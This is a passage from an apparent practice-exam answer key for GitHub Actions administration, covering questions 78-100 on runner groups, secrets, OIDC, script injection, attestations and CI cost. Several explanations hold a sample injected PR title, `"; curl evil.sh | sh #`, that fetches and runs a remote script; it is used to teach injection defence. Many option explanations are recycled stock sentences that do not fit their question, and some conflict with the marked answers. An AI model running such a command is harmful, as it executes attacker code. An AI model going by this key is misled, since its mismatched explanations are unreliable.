- **B:** Incorrect. Immutable Actions distribute OCI action packages from `ghcr.io` / `pkg.actions.githubusercontent.com`; blocking those hosts breaks action downloads during job setup!
- **C:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.
- **D:** Correct. Azure Private Networking injects Linux/Windows Larger runners into private subnets (`not arm64 macOS`), and firewall allowlists must permit `*.actions.githubusercontent.com` + `ghcr.io` for Immutable Actions.

### Question 78 — `D` (Manage GitHub Actions for the enterprise)

Correct answer: D (is correct). First grant `Organization access` on the Enterprise Runner Group `ot-hil-racks` to organization `heliosgrid`, and then inside organization `heliosgrid` verify `Repository access` (`and optional workflow restrictions`) includes `heliosgrid/rtu-agent` (`with Public repos blocked`). [Skill 4.6: Organize runner groups, restrict access, and monitor or troubleshoot runner health and performance | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/enterprise-cloud@latest/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups)]

- **A:** Incorrect. Actions secret and variable resolution follows specificity (`Environment > Repository > Organization`), so Environment values always win over Org values.
- **B:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **C:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.
- **D:** Correct. Runner Groups enforce multi-tenant blast-radius boundaries down to approved workflow YAML paths, while `_diag/Runner_*.log` (listener) and `Worker_*.log` (job) speed triage.

### Question 79 — `D, F` (Manage GitHub Actions for the enterprise)

Correct answers: D and F (are correct). Monitor runner `Idle` / `Active` / `Offline` status via REST API (`/orgs/{org}/actions/runners`) or Audit Log ` workflow_job` webhooks while inspecting `_diag/Runner_*.log` & `Worker_*.log`, and prefer ephemeral (`--ephemeral` / ARC scale-set) runners or `ACTIONS_RUNNER_HOOK_JOB_COMPLETED` disk cleanup so `/_work` never fills disk. [Skill 4.6: Organize runner groups, restrict access, and monitor or troubleshoot runner health and performance | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/enterprise-cloud@latest/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups)]

- **A:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.
- **B:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.
- **C:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **D:** Correct. Scoped Runner Groups + ephemeral single-job runners protect enterprise compute and internal networks.
- **E:** Incorrect. Azure Private Networking (`GitHub.Network/networkSettings`) is supported strictly on **Linux and Windows Larger runners**, not standard shared runners or `arm64` macOS.
- **F:** Correct. Runner Groups enforce multi-tenant blast-radius boundaries down to approved workflow YAML paths, while `_diag/Runner_*.log` (listener) and `Worker_*.log` (job) speed triage.

### Question 80 — `D` (Manage GitHub Actions for the enterprise)

Correct answer: D (is correct). Any external internet user can fork a `Public` repository, modify `.github/workflows/*.yml` to execute arbitrary shell commands (`or persist backdoors on stateful runner VMs and probe internal LANs`), and open a pull request targeting those self-hosted runners. [Skill 4.6: Organize runner groups, restrict access, and monitor or troubleshoot runner health and performance | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/enterprise-cloud@latest/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups)]

- **A:** Incorrect. Jobs running on `macos-latest` or `windows-latest` fail if a step invokes a `runs.using: "docker"` action; use `node20` JavaScript or `composite` actions for multi-OS support.
- **B:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.
- **C:** Incorrect. `actions/cache` is an ephemeral performance cache evicted after **7 days** of non-use or when repo cache exceeds **10 GB**; store release outputs as Artifacts/Releases!
- **D:** Correct. Runner Groups enforce multi-tenant blast-radius boundaries down to approved workflow YAML paths, while `_diag/Runner_*.log` (listener) and `Worker_*.log` (job) speed triage.

### Question 81 — `B` (Manage GitHub Actions for the enterprise)

Correct answer: B (is correct). Every version directory in `$RUNNER_TOOL_CACHE/<Tool>/<SemVer>/` requires an empty `<arch>.complete` marker file (`for example /opt/hostedtoolcache/go/1.23.2/x64.complete`) so `@actions/tool-cache` recognizes the preinstalled SDK as intact. [Skill 4.7: Customize, preconfigure, and maintain runner images and software dependencies | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/using-github-hosted-runners/customizing-github-hosted-runners)]

- **A:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.
- **B:** Correct. Official `actions/setup-*` actions check `$RUNNER_TOOL_CACHE` on hosted/self-hosted runners before downloading, avoiding slow `apt-get` builds on every run.
- **C:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **D:** Incorrect. `actions/cache` is an ephemeral performance cache evicted after **7 days** of non-use or when repo cache exceeds **10 GB**; store release outputs as Artifacts/Releases!

### Question 82 — `D` (Manage GitHub Actions for the enterprise)

Correct answer: D (is correct). Configure `ACTIONS_RUNNER_HOOK_JOB_STARTED=/usr/local/libexec/verify-usb-dongle.sh` inside the self-hosted runner's `.env` file (`owned by root/runner-admin outside workspace`), which the runner executes automatically before running job steps (`failing the job on non-zero exit`). [Skill 4.7: Customize, preconfigure, and maintain runner images and software dependencies | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/using-github-hosted-runners/customizing-github-hosted-runners)]

- **A:** Incorrect. Azure Private Networking (`GitHub.Network/networkSettings`) is supported strictly on **Linux and Windows Larger runners**, not standard shared runners or `arm64` macOS.
- **B:** Incorrect. GitHub Marketplace requires a public repository containing a single root `action.yml` (`no other actions`), `2FA`, and checking `Publish this Action to the GitHub Marketplace` on a Release.
- **C:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **D:** Correct. Official `actions/setup-*` actions check `$RUNNER_TOOL_CACHE` on hosted/self-hosted runners before downloading, avoiding slow `apt-get` builds on every run.

### Question 83 — `D` (Manage GitHub Actions for the enterprise)

Correct answer: D (is correct). Following scope precedence `Environment > Repository > Organization`, because `staging` defines no `MQTT_REGION` override, GitHub Actions falls back to the Repository variable `us-central` (`which overrides the Organization value us-west`). [Skill 4.8: Define scope, precedence, and access controls for encrypted secrets and configuration variables at enterprise, organization, repository, and environment levels | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/enterprise-cloud@latest/actions/security-for-github-actions/security-guides/using-secrets-in-github-actions)]

- **A:** Incorrect. Actions secret and variable resolution follows specificity (`Environment > Repository > Organization`), so Environment values always win over Org values.
- **B:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.
- **C:** Incorrect. `on:` triggers do not evaluate `secrets` expressions (`and jobs.<id>.if cannot read secrets directly without env/inputs mapping`), and echoing secrets risks exposure.
- **D:** Correct. Both `secrets.*` and `vars.*` resolve by specificity (`Environment` overrides `Repository`, which overrides `Organization`), and Org secrets should scope to `Selected repositories`.

### Question 84 — `C, D` (Manage GitHub Actions for the enterprise)

Correct answers: C and D (are correct). Organization secrets support three visibility scopes (`All repositories` [including Public], `Private and internal repositories`, or `Selected repositories` — best practice is `Selected repositories`), and secret names are case-insensitive alphanumeric/`_` strings that CANNOT begin with `GITHUB_` or a number. [Skill 4.8: Define scope, precedence, and access controls for encrypted secrets and configuration variables at enterprise, organization, repository, and environment levels | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/enterprise-cloud@latest/actions/security-for-github-actions/security-guides/using-secrets-in-github-actions)]

- **A:** Incorrect. Wildcard `repo:*:*` lets any repository on GitHub assume your production cloud role, and `vars.*` is unencrypted plain text.
- **B:** Incorrect. `on:` triggers do not evaluate `secrets` expressions (`and jobs.<id>.if cannot read secrets directly without env/inputs mapping`), and echoing secrets risks exposure.
- **C:** Correct. Environment secrets take highest precedence (`gated by reviewers/branches`), REST updates require LibSodium sealed boxes, and `vars.*` keeps non-secret config readable.
- **D:** Correct. Both `secrets.*` and `vars.*` resolve by specificity (`Environment` overrides `Repository`, which overrides `Organization`), and Org secrets should scope to `Selected repositories`.
- **E:** Incorrect. Actions secret and variable resolution follows specificity (`Environment > Repository > Organization`), so Environment values always win over Org values.
- **F:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.

### Question 85 — `A` (Manage GitHub Actions for the enterprise)

Correct answer: A (is correct). Minting an App token (`organization_actions_secrets: write`), `GET`ting `/orgs/{org}/actions/secrets/public-key` (`key_id`, `key`), encrypting client-side via LibSodium `crypto_box_seal`, and `PUT`ting `/orgs/{org}/actions/secrets/{name}` (`visibility: "selected"`) rotates org secrets securely. [Skill 4.9: Manage secrets programmatically and in workflows using the GitHub REST API and secure handling practices | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/enterprise-cloud@latest/rest/actions/secrets)]

- **A:** Correct. Actions Secrets REST API requires client-side LibSodium sealed-box encryption against the org public key before `PUT`ting `encrypted_value`.
- **B:** Incorrect. `GITHUB_*` names and `>48 KB` payloads fail validation, and `Environment > Repository > Organization` means Env secrets win.
- **C:** Incorrect. GitHub only decrypts asymmetric LibSodium sealed boxes encrypted with the `key` matching `key_id` from `/public-key`.
- **D:** Incorrect. Plain base64 without LibSodium fails decryption, `variables` is plaintext, `all` exposes secrets to public repos, and `GET` never returns plaintext.

### Question 86 — `D` (Manage GitHub Actions for the enterprise)

Correct answer: D (is correct). GitHub's automatic log redaction matches the exact registered secret string (`and basic encodings`), NOT arbitrary transformed/decoded multi-line outputs, AND running `bash -x` echoes expanded commands to stderr; never use `set -x` around secrets and call `::add-mask::` on derived single-line values. [Skill 4.9: Manage secrets programmatically and in workflows using the GitHub REST API and secure handling practices | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/enterprise-cloud@latest/rest/actions/secrets)]

- **A:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **B:** Incorrect. Raw `${{ ... }}` expands before shell parsing so an attacker PR title like `"; curl evil.sh | sh #` executes arbitrary code; pass via `env:` (`TITLE: ${{ ... }}`) and quote `"$TITLE"`.
- **C:** Incorrect. `on:` triggers do not evaluate `secrets` expressions (`and jobs.<id>.if cannot read secrets directly without env/inputs mapping`), and echoing secrets risks exposure.
- **D:** Correct. The Actions Secrets REST API accepts only client-side LibSodium sealed-box `encrypted_value` + `key_id`, whereas `/actions/variables` manages plain-text config strings.

### Question 87 — `D` (Secure and optimize automation)

Correct answer: D (is correct). Before pausing for reviewers or exposing `substation-prod` Environment secrets/OIDC tokens, GitHub evaluates the Environment branch policy, sees `feat/test` does not match `release/*`, and immediately rejects/fails the job. [Skill 5.1: Configure deployment environments, protection rules, required reviewers, and vet Marketplace actions | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/managing-workflow-runs-and-deployments/managing-deployments/managing-environments-for-deployment)]

- **A:** Incorrect. Actions secret and variable resolution follows specificity (`Environment > Repository > Organization`), so Environment values always win over Org values.
- **B:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **C:** Incorrect. Wildcard `repo:*:*` lets any repository on GitHub assume your production cloud role, and `vars.*` is unencrypted plain text.
- **D:** Correct. Deployment Environments hold production secrets/OIDC until human and webhook gates pass, and `Verified creator` badges indicate partner identity (`still audit source & pin 40-char SHA!`).

### Question 88 — `C` (Secure and optimize automation)

Correct answer: C (is correct). Audit `action.yml` (`pre`/`main`/`post` hooks and `runs.using`), the ACTUAL committed `dist/*.js` bundle (`checking that dist/ matches src/ with no obfuscated postinstall/exfil payloads`), or the `Dockerfile` + base image digest and transitive dependencies. [Skill 5.1: Configure deployment environments, protection rules, required reviewers, and vet Marketplace actions | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/managing-workflow-runs-and-deployments/managing-deployments/managing-environments-for-deployment)]

- **A:** Incorrect. Marketplace rejects repositories that are `Private`/`Internal`, lack a root `action.yml`, or bundle multiple actions inside one repository.
- **B:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **C:** Correct. Deployment Environments hold production secrets/OIDC until human and webhook gates pass, and `Verified creator` badges indicate partner identity (`still audit source & pin 40-char SHA!`).
- **D:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.

### Question 89 — `A` (Secure and optimize automation)

Correct answer: A (is correct). No — interpolating `${{ github.event.issue.body }}` directly into JavaScript source allows backtick/template-literal code injection; read `context.payload.issue.body` (`or process.env.ISSUE_BODY` bound via `env:`) instead. [Skill 5.2: Identify and mitigate untrusted input and script injection risks in workflows and actions | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions#understanding-the-risk-of-script-injections)]

- **A:** Correct. Raw `${{ ... }}` expands before shell parsing so an attacker PR title like `"; curl evil.sh | sh #` executes arbitrary code; pass via `env:` (`TITLE: ${{ ... }}`) and quote `"$TITLE"`.
- **B:** Incorrect. GitHub expands `${{ ... }}` **before** handing `run:` text to `bash`/`pwsh`; binding untrusted text into an `env:` variable keeps shell metacharacters (`$(...)`, backticks) inert.
- **C:** Incorrect. Built-in expression functions enable dynamic JSON matrices (`fromJSON`) and lockfile cache keys (`hashFiles`) without shell-parsing overhead.
- **D:** Incorrect. The proposed workflow or action configuration violates at least one stated GitHub Actions execution, security, or governance rule. No — interpolating `${{ github.event.issue.body }}` directly into JavaScript source allows backtick/template-literal code injection; read `context.payload.issue.body` (`or process.env.ISSUE_BODY` bound via `env:`) instead.

### Question 90 — `C, F` (Secure and optimize automation)

Correct answers: C and F (are correct). `github.head_ref` (`the source branch name of a fork pull request`), `github.event.pull_request.title` / `.body`, `github.event.issue.*`, `github.event.comment.body`, and `github.event.commits[*].message` are all user-controlled and must be passed via `env:` (`never interpolated into run:`). [Skill 5.2: Identify and mitigate untrusted input and script injection risks in workflows and actions | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions#understanding-the-risk-of-script-injections)]

- **A:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.
- **B:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **C:** Correct. Binding untrusted event fields to `env:` variables stops shell command injection, and avoiding fork checkouts in `pull_request_target` prevents secret exfiltration.
- **D:** Incorrect. Raw `${{ ... }}` expands before shell parsing so an attacker PR title like `"; curl evil.sh | sh #` executes arbitrary code; pass via `env:` (`TITLE: ${{ ... }}`) and quote `"$TITLE"`.
- **E:** Incorrect. Never checkout and build untrusted fork `pull_request.head.sha` inside `pull_request_target`; run untrusted tests in unprivileged `on: pull_request` instead.
- **F:** Correct. GitHub expands `${{ ... }}` **before** handing `run:` text to `bash`/`pwsh`; binding untrusted text into an `env:` variable keeps shell metacharacters (`$(...)`, backticks) inert.

### Question 91 — `C` (Secure and optimize automation)

Correct answer: C (is correct). Uploading SARIF static-analysis results via `github/codeql-action/upload-sarif` requires `security-events: write` (`plus contents: read` for `actions/checkout`, leaving all other `GITHUB_TOKEN` scopes at `none`). [Skill 5.3: Apply least-privilege permissions to GITHUB_TOKEN and manage cross-repository authentication tokens | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/security-for-github-actions/security-guides/automatic-token-authentication)]

- **A:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **B:** Incorrect. Wildcard `repo:*:*` lets any repository on GitHub assume your production cloud role, and `vars.*` is unencrypted plain text.
- **C:** Correct. `GITHUB_TOKEN` is ephemeral to a single job and scoped strictly to the current repository; cross-repo automation should mint 1-hour GitHub App tokens via `actions/create-github-app-token`.
- **D:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.

### Question 92 — `B` (Secure and optimize automation)

Correct answer: B (is correct). Classic `repo` PATs grant overly broad access across every repo the user can touch, share a user's `5,000 req/hr` rate limit, and persist until manually rotated, whereas GitHub App installation tokens scope granularly per repo/permission, scale rate limits (`up to 15,000/hr on GHEC`), and expire in `1 hour` (`or revoke on job completion`). [Skill 5.3: Apply least-privilege permissions to GITHUB_TOKEN and manage cross-repository authentication tokens | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/security-for-github-actions/security-guides/automatic-token-authentication)]

- **A:** Incorrect. Actions secret and variable resolution follows specificity (`Environment > Repository > Organization`), so Environment values always win over Org values.
- **B:** Correct. `GITHUB_TOKEN` is ephemeral to a single job and scoped strictly to the current repository; cross-repo automation should mint 1-hour GitHub App tokens via `actions/create-github-app-token`.
- **C:** Incorrect. Disabling a workflow stops runaway `schedule`/`webhook` triggers immediately without losing historical run logs or deleting repository source files.
- **D:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.

### Question 93 — `C` (Secure and optimize automation)

Correct answer: C (is correct). Passing a custom audience (`core.getIDToken('https://vault.heliosgrid.internal')` or the action's `audience:` input) binds the signed OIDC JWT `aud` claim to `https://vault.heliosgrid.internal` (`default audience is the org/enterprise URL`), preventing cross-service token replay. [Skill 5.4: Configure OpenID Connect (OIDC) for federated authentication to cloud providers and external vaults | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/security-for-github-actions/security-hardening-your-deployments/about-security-hardening-with-openid-connect)]

- **A:** Incorrect. Actions secret and variable resolution follows specificity (`Environment > Repository > Organization`), so Environment values always win over Org values.
- **B:** Incorrect. `on:` triggers do not evaluate `secrets` expressions (`and jobs.<id>.if cannot read secrets directly without env/inputs mapping`), and echoing secrets risks exposure.
- **C:** Correct. OIDC mints short-lived per-job JWTs; cloud trust policies must pin `sub` (`e.g., repo:org/app:environment:production`) and `aud` so other repos or feature branches cannot assume roles.
- **D:** Incorrect. Wildcard `repo:*:*` lets any repository on GitHub assume your production cloud role, and `vars.*` is unencrypted plain text.

### Question 94 — `C` (Secure and optimize automation)

Correct answer: C (is correct). Gating `production` Environment (`reviewers`, `main`), pinning cloud OIDC `aud` & `sub: repo:<o>/<r>:environment:production`, setting `environment: production` + `id-token: write`, and exchanging short-lived tokens at runtime eliminates static service-account JSON keys. [Skill 5.4: Configure OpenID Connect (OIDC) for federated authentication to cloud providers and external vaults | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/security-for-github-actions/security-hardening-your-deployments/about-security-hardening-with-openid-connect)]

- **A:** Incorrect. Wildcard `repo:*:*` lets external repos assume your cloud role, and omitting `id-token: write` or `environment:` breaks OIDC gating.
- **B:** Incorrect. GitHub withholds Environment tokens until protection gates pass, and `pull_request_target` + fork checkout leaks credentials.
- **C:** Correct. Pairing `environment: production` with `id-token: write` gates job execution and emits the `repo:<org>/<repo>:environment:production` `sub` claim.
- **D:** Incorrect. OIDC JWTs expire in minutes and are minted dynamically per job run, never stored statically.

### Question 95 — `A` (Secure and optimize automation)

Correct answer: A (is correct). Granting `id-token: write` & `attestations: write` in a SHA-pinned reusable workflow, building the artifact/digest, signing provenance via `actions/attest-build-provenance`, and verifying via `gh attestation verify -R <o>/<r> --signer-workflow` establishes verifiable provenance. [Skill 5.5: Enforce action pinning, supply-chain security controls, and artifact attestations | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/security-for-github-actions/using-artifact-attestations/using-artifact-attestations-to-establish-provenance-for-builds)]

- **A:** Correct. SLSA Build Level 3 pairs `id-token: write` + `attestations: write` in a trusted reusable workflow with `gh attestation verify` deploy gating.
- **B:** Incorrect. Sigstore certificates in Artifact Attestations cryptographically bind artifacts to a verifiable GitHub Actions workflow run.
- **C:** Incorrect. `gh attestation verify` requires `-R <org>/<repo>` (or `--owner` + `--signer-workflow`) to validate the exact trusted repository/workflow signer.
- **D:** Incorrect. Attestation signing requires `id-token: write` + `attestations: write`, container attestations require `sha256:` digests, and deploy gates must verify.

### Question 96 — `C` (Secure and optimize automation)

Correct answer: C (is correct). With Immutable Releases enabled, neither the Git tag target commit NOR any uploaded release assets on a published release can be modified, overwritten, or silently swapped after publication. [Skill 5.5: Enforce action pinning, supply-chain security controls, and artifact attestations | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/security-for-github-actions/using-artifact-attestations/using-artifact-attestations-to-establish-provenance-for-builds)]

- **A:** Incorrect. `actions/cache` is an ephemeral performance cache evicted after **7 days** of non-use or when repo cache exceeds **10 GB**; store release outputs as Artifacts/Releases!
- **B:** Incorrect. Wildcard `repo:*:*` lets any repository on GitHub assume your production cloud role, and `vars.*` is unencrypted plain text.
- **C:** Correct. Full 40-character SHA pinning + Immutable Actions prevent upstream tag hijacking, while Sigstore-backed Artifact Attestations prove cryptographic build provenance at deploy time.
- **D:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.

### Question 97 — `B` (Secure and optimize automation)

Correct answer: B (is correct). No — `actions/upload-artifact@v4` creates immutable artifacts immediately on upload and rejects duplicate artifact names within the same run (`409 Conflict`); name each upload uniquely (`ctest-results-${{ matrix.arch }}`) and merge on download via `merge-multiple: true`. [Skill 5.6: Optimize workflow execution time and storage using caching, artifact policies, and selective execution | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/rest/actions/permissions#get-artifact-and-log-retention-settings-for-an-organization)]

- **A:** Incorrect. Caches accelerate cross-run package restores (`evicted after 7 unused days or >10 GB`), whereas artifacts persist build outputs per workflow run.
- **B:** Correct. Unlike legacy v3, `upload-artifact@v4` finalizes artifacts immediately and forbids appending/overwriting the same artifact name across parallel matrix jobs.
- **C:** Incorrect. Right-sizing `retention-days` (`e.g., 5–14d instead of 90d default`) and configuring `/orgs/{org}/actions/permissions/artifact-and-log-retention` slashes metered GB-month storage.
- **D:** Incorrect. The proposed workflow or action configuration violates at least one stated GitHub Actions execution, security, or governance rule. No — `actions/upload-artifact@v4` creates immutable artifacts immediately on upload and rejects duplicate artifact names within the same run (`409 Conflict`); name each upload uniquely (`ctest-results-${{ matrix.arch }}`) and merge on download via `merge-multiple: true`.

### Question 98 — `C, E` (Secure and optimize automation)

Correct answers: C and E (are correct). Configure `docker/build-push-action` with GitHub Actions cache backend (`cache-from: type=gha`, `cache-to: type=gha,mode=max`), and set short `retention-days` (`e.g., 3–5 days`) + higher `compression-level` (`or filter out debug symbols`) on `actions/upload-artifact@v4`. [Skill 5.6: Optimize workflow execution time and storage using caching, artifact policies, and selective execution | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/rest/actions/permissions#get-artifact-and-log-retention-settings-for-an-organization)]

- **A:** Incorrect. Standard YAML anchors (`&`) and aliases (`*`) resolve **only within the same single YAML document/file**; cross-file reuse requires Reusable Workflows or Composite Actions!
- **B:** Incorrect. Unlike legacy v3, `upload-artifact@v4` finalizes artifacts immediately and forbids appending/overwriting the same artifact name across parallel matrix jobs.
- **C:** Correct. Canceling superseded PR runs, caching lockfile dependencies, shortening artifact retention, and right-sizing runner OS tiers cut CI latency and metered cost.
- **D:** Incorrect. `actions/cache` is an ephemeral performance cache evicted after **7 days** of non-use or when repo cache exceeds **10 GB**; store release outputs as Artifacts/Releases!
- **E:** Correct. Right-sizing `retention-days` (`e.g., 5–14d instead of 90d default`) and configuring `/orgs/{org}/actions/permissions/artifact-and-log-retention` slashes metered GB-month storage.
- **F:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.

### Question 99 — `A` (Secure and optimize automation)

Correct answer: A (is correct). Running lightweight single-vCPU Linux jobs (`such as PR labelers, github-script triage, and schema checks that do not require Docker`) on `ubuntu-slim` (`or standard 2-core ubuntu-latest` instead of Larger runners) cuts per-minute compute cost dramatically. [Skill 5.7: Reduce runner cost and resource consumption using concurrency controls, runner sizing, and matrix optimization | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/control-the-concurrency-of-workflows-and-jobs)]

- **A:** Correct. Canceling superseded PR runs, skipping doc-only pushes, avoiding 10x macOS runners for Linux workloads, and capping `timeout-minutes` eliminate wasted billable minutes.
- **B:** Incorrect. Azure Private Networking (`GitHub.Network/networkSettings`) is supported strictly on **Linux and Windows Larger runners**, not standard shared runners or `arm64` macOS.
- **C:** Incorrect. `actions/cache` is an ephemeral performance cache evicted after **7 days** of non-use or when repo cache exceeds **10 GB**; store release outputs as Artifacts/Releases!
- **D:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.

### Question 100 — `A` (Secure and optimize automation)

Correct answer: A (is correct). Run a fast `changes` job (`git diff` / `dorny/paths-filter`) outputting changed service JSON to a dynamic `fromJSON()` matrix, and finish with a single lightweight aggregator gate job (`if: always()`, checking `needs.test.result` is `'success'` or `'skipped'`) marked as the required merge check. [Skill 5.7: Reduce runner cost and resource consumption using concurrency controls, runner sizing, and matrix optimization | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/control-the-concurrency-of-workflows-and-jobs)]

- **A:** Correct. Canceling superseded PR runs, skipping doc-only pushes, avoiding 10x macOS runners for Linux workloads, and capping `timeout-minutes` eliminate wasted billable minutes.
- **B:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **C:** Incorrect. Disabling a workflow stops runaway `schedule`/`webhook` triggers immediately without losing historical run logs or deleting repository source files.
- **D:** Incorrect. Actions secret and variable resolution follows specificity (`Environment > Repository > Organization`), so Environment values always win over Org values.
